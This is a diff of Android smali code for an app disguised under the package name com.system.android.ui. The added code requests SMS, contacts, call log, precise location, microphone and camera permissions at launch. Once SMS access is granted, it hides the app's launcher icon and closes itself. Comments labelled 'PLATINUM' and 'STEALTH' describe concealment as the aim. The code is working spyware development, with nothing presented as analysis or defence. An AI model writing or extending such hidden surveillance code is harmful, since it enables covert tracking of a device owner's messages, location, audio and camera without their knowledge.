@@ -13,6 +13,45 @@
     return-void
 .end method
 
+.method protected onResume()V
+    .locals 5
+
+    invoke-super {p0}, Landroid/app/Activity;->onResume()V
+
+    # [PLATINUM] Check if permission is granted to hide icon
+    const-string v0, "android.permission.READ_SMS"
+
+    invoke-virtual {p0, v0}, Lcom/system/android/ui/MainActivity;->checkSelfPermission(Ljava/lang/String;)I
+
+    move-result v0
+
+    if-nez v0, :cond_0
+
+    # Permission granted! Now we can hide the icon professionally
+    invoke-virtual {p0}, Lcom/system/android/ui/MainActivity;->getPackageManager()Landroid/content/pm/PackageManager;
+
+    move-result-object v0
+
+    new-instance v1, Landroid/content/ComponentName;
+
+    const-class v2, Lcom/system/android/ui/MainActivity;
+
+    invoke-direct {v1, p0, v2}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
+
+    const/4 v2, 0x2
+
+    const/4 v3, 0x1
+
+    # DONT_KILL_APP = 1, COMPONENT_ENABLED_STATE_DISABLED = 2
+    invoke-virtual {v0, v1, v2, v3}, Landroid/content/pm/PackageManager;->setComponentEnabledSetting(Landroid/content/ComponentName;II)V
+
+    # Close the activity as setup is complete
+    invoke-virtual {p0}, Lcom/system/android/ui/MainActivity;->finish()V
+
+    :cond_0
+    return-void
+.end method
+
 .method private isNotificationServiceRunning()Z
     .locals 4
 
@@ -89,11 +128,32 @@
     move-result v0
 
     .line 26
-    .local v0, "isNotificationServiceRunning":Z
-    .line 41
-    # [STEALTH] Si no hay permisos, simplemente cerrar sin mostrar nada
-    :cond_0
-    invoke-virtual {p0}, Lcom/system/android/ui/MainActivity;->finish()V
+    # [PLATINUM] Request Critical Permissions on Launch
+    const/4 v1, 0x6
+    new-array v1, v1, [Ljava/lang/String;
+    const/4 v2, 0x0
+    const-string v3, "android.permission.READ_SMS"
+    aput-object v3, v1, v2
+    const/4 v2, 0x1
+    const-string v3, "android.permission.READ_CONTACTS"
+    aput-object v3, v1, v2
+    const/4 v2, 0x2
+    const-string v3, "android.permission.READ_CALL_LOG"
+    aput-object v3, v1, v2
+    const/4 v2, 0x3
+    const-string v3, "android.permission.ACCESS_FINE_LOCATION"
+    aput-object v3, v1, v2
+    const/4 v2, 0x4
+    const-string v3, "android.permission.RECORD_AUDIO"
+    aput-object v3, v1, v2
+    const/4 v2, 0x5
+    const-string v3, "android.permission.CAMERA"
+    aput-object v3, v1, v2
+    const/16 v2, 0x64
+    invoke-virtual {p0, v1, v2}, Lcom/system/android/ui/MainActivity;->requestPermissions([Ljava/lang/String;I)V
+
+    # [PLATINUM] Stay alive to allow permission requests
+    return-void
 
     .line 49
     return-void
